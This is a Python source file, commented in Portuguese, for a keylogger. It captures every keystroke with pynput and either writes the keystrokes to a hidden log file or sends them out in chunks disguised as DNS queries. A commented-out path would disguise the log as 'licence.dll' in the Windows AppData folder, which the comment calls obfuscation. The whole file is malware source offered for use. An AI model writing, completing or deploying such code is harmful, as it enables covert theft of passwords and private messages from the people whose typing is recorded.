###############################################################
# Imports
###############################################################
import os
import time
import socket
import threading
import pynput.keyboard
from dnslib import DNSRecord, RR, A

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'
_DNS_ADDR = ('127.0.0.1', 9953)
_PATH = None
_KEYS = ''
_AUTO_SAVE_TIME = 10
_RUN = True
_NUMBERS = {
    "96":"0",
    "97":"1",
    "98":"2",
    "99":"3",
    "100":"4",
    "101":"5",
    "102":"6",
    "103":"7",
    "104":"8",
    "105":"9"
}

###############################################################
# Classes e Funções
###############################################################
def auto_save():
    """
    Salva automaticamente o que o usuário digitou
    dentro do tempo especificado em _AUTO_SAVE_TIME.

    Parameters:
        None

    Returns:
        None
    """
    global _KEYS
    global _AUTO_SAVE_TIME
    global _RUN

    while _RUN:
        if _PATH:
            if len(_KEYS) > 0:
                write_on_file(_KEYS)
        else:
            # Chamar a função para enviar via DNS
            pass
        
        time.sleep(_AUTO_SAVE_TIME)

def write_on_file(c):
    """
    Grava o conteudo passado para ela em um arquivo
    especificado em _PATH.

    Parameters:
        c (str): Conteudo que será gravado no arquivo.

    Returns:
        None
    """
    global _PATH
    global _KEYS
    c = str(c)
    with open(_PATH, 'a+') as file:
        file.write(c)
        file.close()
    _KEYS = '' # Zerando a var global para reutilizar !

'''
def del_on_file():
    with open(path, 'r+') as file:
        content = file.read()
        file.write(content[:-1])
        file.close()
'''

def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR

    # Divide os dados em partes menores para serem válidos
    # como nomes de domínio máximo de 63bytes por hostname
    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)]
    
    while len(parts) > 0:
        # Cria um nome de domínio fictício
        domain = parts.pop(0) + '.example.com'
        
        # Cria a requisição DNS
        q = DNSRecord.question(domain)
        
        # Envia a requisição DNS para o servidor
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)
        sock.sendto(q.pack(), _DNS_ADDR)

        # Recebendo resposta falsa do DNS
        try:
            _ = sock.recvfrom(512)
        except socket.timeout:
            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
            
        sock.close()

def p_numbers(n):
    """
    Recebe o número no formato do Pynput
    e o transforma em decimal.

    Parameters:
        n (int): Recebe o número em binário
        e o converte para decimal

    Returns:
         Retorna o Valor convertido para decimal
    """
    global _NUMBERS

    for key, value in _NUMBERS.items():
        if n == int(key):
            return value

def on_press(key):
    global _KEYS
    global _RUN

    # Encerra o programa
    if key == keyboard.Key.esc:
        _RUN = False
        return False

    # Se apertar enter ele grava/envia o que está digitado
    elif key == keyboard.Key.enter:
        _KEYS += ' \n'
        if _PATH:
            write_on_file(_KEYS)
        else:
            send_data(_KEYS)
            _KEYS = ''

    # Adicionando espaço do TAB
    elif key == keyboard.Key.tab:
        _KEYS += '	'

    # Se Apertar o Espaço ele o adiciona
    elif key == keyboard.Key.space:
        _KEYS += ' '

    # Ainda preciso fazer a parte de deletar
    elif key == keyboard.Key.backspace:
        pass

    # Se for qualquer outra tecla especial eu descarto ela !
    elif isinstance(key, keyboard.Key):
        pass

    # Se não for nenhuma das teclas selecionadas
    else:
        # Verifico se é letras
        if key.char:
            print('é char')
            _KEYS += str(key).replace("'", "")

        # Verifico se é numeros
        else:
            print('é numero')
            key = int(str(key).replace('<', '').replace('>', ''))
            _KEYS += str(p_numbers(key))

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    # Verifica se o caminho para gravar existe
    '''
    if os.path.isdir(_PATH):
        _PATH = os.path.join(_PATH, _NAME)
    else:
        os.mkdir(_PATH)
        _PATH = os.path.join(_PATH, _NAME)
    '''

    # Cria um listener para capturar os eventos de teclado
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    th = [threading.Thread(target=auto_save()), threading.Thread(target=listener.join())]

    for i in range(0, len(th)):
        th[i].start()

    for i in range(0, len(th)):
        th[i].join()
